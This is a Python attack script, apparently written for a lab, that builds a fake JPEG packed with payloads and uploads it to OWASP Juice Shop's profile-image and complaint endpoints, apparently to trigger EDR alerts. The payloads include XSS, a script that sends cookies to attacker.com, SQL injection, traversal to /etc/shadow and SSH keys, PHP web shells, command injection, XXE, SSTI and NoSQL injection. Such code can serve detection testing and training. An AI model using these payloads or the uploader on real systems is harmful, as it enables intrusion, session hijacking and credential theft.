#!/usr/bin/env python3
# File Upload Attack Script
# For educational purposes only
# NOTE: This Python file itself can be uploaded to trigger EDR alerts!

import requests
import os
import time

# Embedded malicious patterns that will trigger EDR when this file is scanned:
# <script>alert('Direct XSS in Python file');</script>
# SELECT * FROM users WHERE admin=1;
# ../../../etc/passwd
# <?php system($_GET['cmd']); ?>

def create_malicious_file():
    # Create a malicious image file that looks like a valid JPEG
    temp_dir = "/tmp/malicious_uploads"
    os.makedirs(temp_dir, exist_ok=True)
    
    # Valid JPEG header to bypass file type checks
    jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00'
    
    # Malicious content embedded as "metadata" or comments
    malicious_content = b"""
<!-- XSS Payloads -->
<script>alert('Image XSS attack');</script>
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('SVG XSS')>

<!-- SQL Injection Payloads -->
'; DROP TABLE users; --
' OR '1'='1' --
' UNION SELECT password FROM users --
SELECT * FROM admin_table WHERE 1=1;

<!-- Directory Traversal -->
../../../etc/passwd
../../../etc/shadow
../../../home/juice/.ssh/id_rsa
../../../../../../../../etc/passwd
../../../../../../windows/system32/config/sam

<!-- PHP Web Shell -->
<?php system($_GET['cmd']); ?>
<?php exec($_POST['command']); ?>
<?php eval($_REQUEST['code']); ?>

<!-- Command Injection -->
; cat /etc/passwd
| whoami
& id
&& uname -a

<!-- File Inclusion -->
include('../../../etc/passwd');
require('../../../../etc/shadow');

<!-- SSTI payload -->
{{7*7}}
{{config.items()}}

<!-- XXE payload -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Base64 Encoded Payloads -->
PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+

<!-- LDAP Injection -->
*)(uid=*))(|(uid=*

<!-- NoSQL Injection -->
{"$ne": null}
{"$gt": ""}

"""
    
    # JPEG end marker
    jpeg_end = b'\xFF\xD9'
    
    # Combine all parts
    file_content = jpeg_header + malicious_content + jpeg_end
    
    file_path = os.path.join(temp_dir, "malicious_image.jpg")
    with open(file_path, 'wb') as f:
        f.write(file_content)
    
    print(f"Created malicious image file: {file_path}")
    print("File contains: XSS, SQL Injection, Directory Traversal, Web Shell, Command Injection")
    print("File appears as valid JPEG but contains malicious payloads")
    
    return file_path

def attempt_file_upload(target_ip, file_path):
    # Try to upload file to Juice Shop profile image endpoint
    upload_url = f"http://{target_ip}:3000/profile-image"
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f, 'image/jpeg')}
            
            # Add form data that might be expected
            data = {'type': 'image', 'category': 'profile'}
            
            response = requests.post(upload_url, files=files, data=data, timeout=10)
            
            if response.status_code == 200:
                return True, "Upload successful"
            elif response.status_code == 204:
                return True, "Upload accepted (no content)"
            elif response.status_code == 201:
                return True, "Upload created successfully"
            elif response.status_code == 403:
                return False, "Upload forbidden"
            elif response.status_code == 413:
                return False, "File too large"
            elif response.status_code == 500:
                return False, "Server error (possible illegal file type)"
            else:
                return False, f"HTTP {response.status_code}: {response.text[:100]}"
                
    except requests.exceptions.Timeout:
        return False, "Upload timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Error: {str(e)}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def test_complaint_upload(target_ip, file_path):
    # Try customer complaint file upload (another common endpoint)
    complaint_url = f"http://{target_ip}:3000/rest/user/complaint"
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f, 'text/plain')}
            data = {'message': 'Test complaint with malicious file'}
            
            response = requests.post(complaint_url, files=files, data=data, timeout=10)
            
            if response.status_code in [200, 201, 204]:
                return True, "Complaint upload successful"
            else:
                return False, f"HTTP {response.status_code}"
                
    except Exception as e:
        return False, f"Error: {str(e)}"

def main():
    print("File Upload Attack Script")
    print("Educational use only!")
    print("")
    
    # Get target IP
    target_ip = input("Enter Juice Shop IP address: ")
    
    # Test connection
    print(f"Testing connection to {target_ip}:3000...")
    try:
        response = requests.get(f"http://{target_ip}:3000", timeout=5)
        print("Connection successful!")
    except:
        print("Cannot reach target. Make sure Juice Shop is running.")
        return
    
    print("")
    print("Creating malicious file...")
    
    # Create single malicious file
    file_path = create_malicious_file()
    
    print("Starting file upload attack...")
    print("")
    
    successful_uploads = []
    filename = os.path.basename(file_path)
    
    print(f"Uploading: {filename}")
    
    # Try main file upload endpoint
    success, message = attempt_file_upload(target_ip, file_path)
    
    if success:
        print(f"  ✓ SUCCESS: {message}")
        successful_uploads.append(filename)
    else:
        print(f"  ✗ Main upload failed: {message}")
        
        # Try complaint upload as backup
        print(f"  Trying complaint upload...")
        success2, message2 = test_complaint_upload(target_ip, file_path)
        
        if success2:
            print(f"  ✓ SUCCESS via complaint: {message2}")
            successful_uploads.append(f"{filename} (complaint)")
        else:
            print(f"  ✗ Complaint upload failed: {message2}")
    
    print("")
    
    # Clean up temporary file
    print("Cleaning up temporary file...")
    try:
        os.remove(file_path)
        os.rmdir("/tmp/malicious_uploads")
    except:
        pass
    
    # Show results
    print("=== Attack Results ===")
    if successful_uploads:
        print(f"Successfully uploaded malicious file:")
        for upload in successful_uploads:
            print(f"  ✓ {upload}")
        print("")
        print("Check your EDR for file creation and content alerts!")
    else:
        print("File upload failed")
        print("Application may have upload restrictions")
    
    print("")
    print("Attack finished.")

if __name__ == "__main__":
    main()